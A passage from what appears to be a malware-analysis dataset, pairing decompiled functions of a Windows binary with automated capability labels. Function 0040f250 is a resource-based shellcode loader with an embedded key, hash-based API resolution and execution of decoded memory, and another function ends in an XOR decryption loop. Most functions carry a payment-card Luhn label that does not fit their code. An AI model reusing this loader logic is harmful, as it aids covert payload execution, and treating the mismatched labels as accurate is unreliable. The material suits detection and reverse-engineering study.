*0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                LOCK();\n                iVar5 = *0x52e7fc + -1;\n                iVar7 = *0x52e7fc + -1;\n                bVar10 = *0x52e7fc == 1;\n                *0x52e7fc = iVar5;\n                if (bVar10 || iVar7 < 0) {\n                    (**(**0x52e7f0 + 4))();\n                }\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                in_stack_00000024 = 0x239;\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                uStack3684 = 0x52e800;\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                uVar2 = 0;\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                in_stack_fffff194 = 0x52e800;\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670();\n                fcn.0040f650();\n                fcn.0040f620();\n                fcn.0040f670(0x52e800);\n                uStack4 = 0xffffffff;\n                fcn.0040f650();\n            }\n            iStack2188 = iStack2188 + 1;\n            puVar1 = param_2 + -1 + iStack2188;\n            *puVar1 = *puVar1 ^ *(&ppiStack2180 + (*(&ppiStack2180 + uStack3684) + uVar2) % 0x873);\n        } while (param_3 != 0);\n    }\n    *in_FS_OFFSET = piStack12;\n    fcn.0045e747(in_stack_fffff194);\n    return;\n}\n",
        "token_count": 81335
    },
    "0040f1e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nint32_t fcn.0040f1e0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t unaff_ESI;\n    uint32_t uVar5;\n    \n    iVar4 = *(*(unaff_ESI + 0x3c) + 0x78 + unaff_ESI);\n    iVar1 = *(iVar4 + 0x24 + unaff_ESI);\n    iVar4 = iVar4 + unaff_ESI;\n    iVar2 = *(iVar4 + 0x1c);\n    uVar3 = *(iVar4 + 0x18);\n    uVar5 = 0;\n    if (uVar3 != 0) {\n        do {\n            iVar4 = fcn.004028e0();\n            if (iVar4 == 0x16de565f) {\n                return *(iVar2 + unaff_ESI + *(iVar1 + unaff_ESI + uVar5 * 2) * 4) + unaff_ESI;\n            }\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 269
    },
    "0040f250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040f250(uint param_1)\n\n{\n    uint32_t arg_8h;\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t arg_ch;\n    uint arg_10h;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    int32_t **in_FS_OFFSET;\n    uint auStack48 [2];\n    uint32_t uStack40;\n    int32_t *piStack32;\n    uint uStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x490b78;\n    piStack12 = *in_FS_OFFSET;\n    uStack16 = *0x4b8030 ^ auStack48;\n    arg_8h = *0x4b8030 ^ &stack0xffffffc0;\n    *in_FS_OFFSET = &piStack12;\n    auStack48[0] = param_1;\n    uStack20 = 0xf;\n    uStack24 = 0;\n    uStack40 = uStack40 & 0xffffff00;\n    fcn.0040fb50(\"aH4IcWZdSRqeJhOkuSoUs8hhpuk4EaxjMSJSwIuQ3QpNTX7enMAvWRwa1pSv8TUk\", 0x40);\n    pcVar2 = _sym.imp.KERNEL32.dll_LoadLibraryExW;\n    piStack12 = NULL;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(L\"WerFault.exe\", 0, 0);\n    if (iVar1 == 0) {\n        uStack24 = 0xffffffff;\n        if (0xf < uStack40) {\n            fcn.004115a4(unaff_ESI);\n        }\n    }\n    else {\n        (*pcVar2)(0x4a1b70, 0, 0);\n        pcVar2 = fcn.0040f1e0();\n        iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(0, 0x1e62, 10);\n        if (iVar1 == 0) {\n            uStack24 = 0xffffffff;\n            if (0xf < uStack40) {\n                fcn.004115a4(unaff_ESI);\n            }\n        }\n        else {\n            arg_ch = (*_sym.imp.KERNEL32.dll_LoadResource)(0, iVar1);\n            if (arg_ch == 0) {\n                uStack24 = 0xffffffff;\n                if (0xf < uStack40) {\n                    fcn.004115a4(unaff_ESI);\n                }\n            }\n            else {\n                arg_10h = (*_sym.imp.KERNEL32.dll_SizeofResource)(0, iVar1);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0, arg_10h, 0x3000, unaff_EBX, 0);\n                pcVar2 = (*pcVar2)(uVar3);\n                if (pcVar2 == NULL) {\n                    uStack24 = 0xffffffff;\n                    fcn.0040f730();\n                }\n                else {\n                    fcn.004670f0(pcVar2, arg_ch, arg_10h);\n                    fcn.00402910(pcVar2, arg_10h);\n                    (*pcVar2)();\n                    uStack24 = 0xffffffff;\n                    fcn.0040f730();\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = piStack32;\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 823
    },
    "0040f620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0040f620(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.0042407a();\n    if (piVar1 == NULL) {\n        piVar1 = fcn.00401280(0x80004005);\n    }\n    iVar2 = (**(*piVar1 + 0xc))();\n    *param_1 = iVar2 + 0x10;\n    return param_1;\n}\n",
        "token_count": 119
    },
    "0040f6f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0040f6f0(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 4) = 0;\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.0040fb50(param_2, pcVar2 - (param_2 + 1));\n    return param_1;\n}\n",
        "token_count": 164
    },
    "0040f730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f730(int32_t param_1)\n\n{\n    if (0xf < *(param_1 + 0x18)) {\n        fcn.004115a4(*(param_1 + 4));\n    }\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 4) = 0;\n    return;\n}\n",
        "token_count": 102
    },
    "0040f770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0040f770(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    ushort uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    uint uVar5;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_2, (param_3 >> 4) + 1 & 0xffff, 6);\n    if (iVar3 != 0) {\n        puVar4 = fcn.00402670(param_2, iVar3, param_3);\n        if (puVar4 != NULL) {\n            uVar1 = *puVar4;\n            uVar5 = (**0x4b94e8)();\n            iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar5, 0, puVar4 + 1, uVar1, 0, 0, 0, 0);\n            if ((1U - *(*param_1 + -4) | *(*param_1 + -8) - iVar3) < 0) {\n                fcn.0040fb00(iVar3);\n            }\n            uVar5 = (**0x4b94e8)(0, puVar4 + 1, *puVar4, *param_1, iVar3, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar5);\n            if ((-1 < iVar3) && (iVar3 <= *(*param_1 + -8))) {\n                *(*param_1 + -0xc) = iVar3;\n                *(iVar3 + *param_1) = 0;\n                return 1;\n            }\n            fcn.00401280(0x80070057);\n            pcVar2 = swi(3);\n            uVar5 = (*pcVar2)();\n            return uVar5;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 437
    },
    "0040f840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0040f840(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    if (param_2 == NULL) {\n        fcn.00401280(0x80004005);\n        param_2 = extraout_ECX;\n    }\n    iVar1 = (**(*param_2 + 0xc))();\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 122
    },
    "0040f900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0040f900(int32_t param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    int32_t *arg_8h;\n    int32_t *piVar1;\n    uint32_t arg_14h;\n    \n    if (*(param_2 + 0x14) < param_3) {\n        fcn.00488300();\n    }\n    arg_14h = *(param_2 + 0x14) - param_3;\n    if (param_4 < arg_14h) {\n        arg_14h = param_4;\n    }\n    if (param_1 != param_2) {\n        if (arg_14h == 0xffffffff) {\n            fcn.0048826f();\n        }\n        if (*(param_1 + 0x18) < arg_14h) {\n            fcn.0040ff00(arg_14h, *(param_1 + 0x14));\n        }\n        else if (arg_14h == 0) {\n            *(param_1 + 0x14) = 0;\n            if (*(param_1 + 0x18) < 0x10) {\n                *(param_1 + 4) = 0;\n                return param_1;\n            }\n            **(param_1 + 4) = 0;\n            return param_1;\n        }\n        if (arg_14h != 0) {\n            if (*(param_2 + 0x18) < 0x10) {\n                param_2 = param_2 + 4;\n            }\n            else {\n                param_2 = *(param_2 + 4);\n            }\n            piVar1 = param_1 + 4;\n            arg_8h = piVar1;\n            if (0xf < *(param_1 + 0x18)) {\n                arg_8h = *piVar1;\n            }\n            fcn.0045f3a0(arg_8h, *(param_1 + 0x18), param_2 + param_3, arg_14h);\n            *(param_1 + 0x14) = arg_14h;\n            if (0xf < *(param_1 + 0x18)) {\n                piVar1 = *piVar1;\n            }\n            *(piVar1 + arg_14h) = 0;\n        }\n        return param_1;\n    }\n    fcn.0040fc20(arg_14h + param_3, 0xffffffff);\n    fcn.0040fc20(0, param_3);\n    return param_1;\n}\n",
        "token_count": 583
    },
    "0040fe30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040fe30(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *unaff_EBP;\n    int32_t **ppiVar6;\n    \n    iVar2 = *param_1;\n    iVar3 = *(iVar2 + -0xc);\n    ppiVar6 = iVar2 + -0x10;\n    puVar4 = (**(**ppiVar6 + 0x10))();\n    iVar5 = (***puVar4)(param_2, 1);\n    if (iVar5 == 0) {\n        fcn.0040fe20();\n    }\n    if (iVar3 < param_2) {\n        param_2 = iVar3;\n    }\n    fcn.0045f3a0(iVar5 + 0x10, param_2 + 1, iVar2, param_2 + 1);\n    *(iVar5 + 4) = iVar3;\n    piVar1 = iVar2 + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar6 + 4))(ppiVar6);\n    }\n    *unaff_EBP = iVar5 + 0x10;\n    return;\n}\n",
        "token_count": 335
    },
    "0040fb50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0040fb50(int32_t param_1, uint *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    uVar1 = *(param_1 + 0x18);\n    puVar4 = param_1 + 4;\n    puVar3 = puVar4;\n    if (0xf < uVar1) {\n        puVar3 = *puVar4;\n    }\n    if (puVar3 <= param_2) {\n        puVar3 = puVar4;\n        if (0xf < uVar1) {\n            puVar3 = *puVar4;\n        }\n        if (param_2 < *(param_1 + 0x14) + puVar3) {\n            if (0xf < uVar1) {\n                puVar4 = *puVar4;\n            }\n            iVar2 = fcn.0040f900(param_1, param_2 - puVar4, param_3);\n            return iVar2;\n        }\n    }\n    if (param_3 == 0xffffffff) {\n        fcn.0048826f();\n    }\n    if (*(param_1 + 0x18) < param_3) {\n        fcn.0040ff00(param_3, *(param_1 + 0x14));\n    }\n    else if (param_3 == 0) {\n        *(param_1 + 0x14) = 0;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar4 = *puVar4;\n        }\n        *puVar4 = 0;\n        return param_1;\n    }\n    if (param_3 != 0) {\n        puVar3 = puVar4;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar3 = *puVar4;\n        }\n        fcn.0045f3a0(puVar3, *(param_1 + 0x18), param_2, param_3);\n        *(param_1 + 0x14) = param_3;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar4 = *puVar4;\n        }\n        *(puVar4 + param_3) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 538
    },
    "0040fc20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0040fc20(int32_t param_1, uint *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    uVar1 = param_2;\n    if (*(param_1 + 0x14) < param_2) {\n        fcn.00488300();\n    }\n    uVar2 = *(param_1 + 0x14) - param_2;\n    if (uVar2 < param_3) {\n        param_3 = uVar2;\n    }\n    if (param_3 != 0) {\n        puVar5 = param_1 + 4;\n        puVar4 = puVar5;\n        param_2 = puVar5;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar4 = *puVar5;\n            param_2 = *puVar5;\n        }\n        fcn.0045ef9e(puVar4 + uVar1, *(param_1 + 0x18) - uVar1, param_2 + param_3 + uVar1, uVar2 - param_3);\n        iVar3 = *(param_1 + 0x14) - param_3;\n        *(param_1 + 0x14) = iVar3;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar5 = *puVar5;\n        }\n        *(iVar3 + puVar5) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 371
    },
    "004105f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004105f0(code **param_1)\n\n{\n    uint32_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x48eeb8;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x4b8030 ^ &stack0xffffffec;\n    *in_FS_OFFSET = &piStack12;\n    *param_1 = vtable.CTrackerDoc.0;\n    uStack4 = 0;\n    fcn.0042779e(uVar1);\n    uStack4 = 0xffffffff;\n    fcn.00428ac6();\n    *in_FS_OFFSET = piStack12;\n    return;\n}\n",
        "token_count": 176
    },
    "00410d50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410d50(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t *in_EAX;\n    int32_t unaff_ESI;\n    \n    param_2 = param_2 + param_1;\n    param_3 = param_3 + unaff_ESI;\n    *in_EAX = param_1;\n    in_EAX[1] = unaff_ESI;\n    in_EAX[2] = param_2;\n    in_EAX[3] = param_3;\n    if (param_2 < param_1) {\n        *in_EAX = param_2;\n        in_EAX[2] = param_1;\n    }\n    if (param_3 < unaff_ESI) {\n        in_EAX[1] = param_3;\n        in_EAX[3] = unaff_ESI;\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "004115b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.004115b3(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00460c0e(param_1, param_2, 0x10);\n    return iVar1 == 0;\n}\n",
        "token_count": 62
    },
    "004115cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
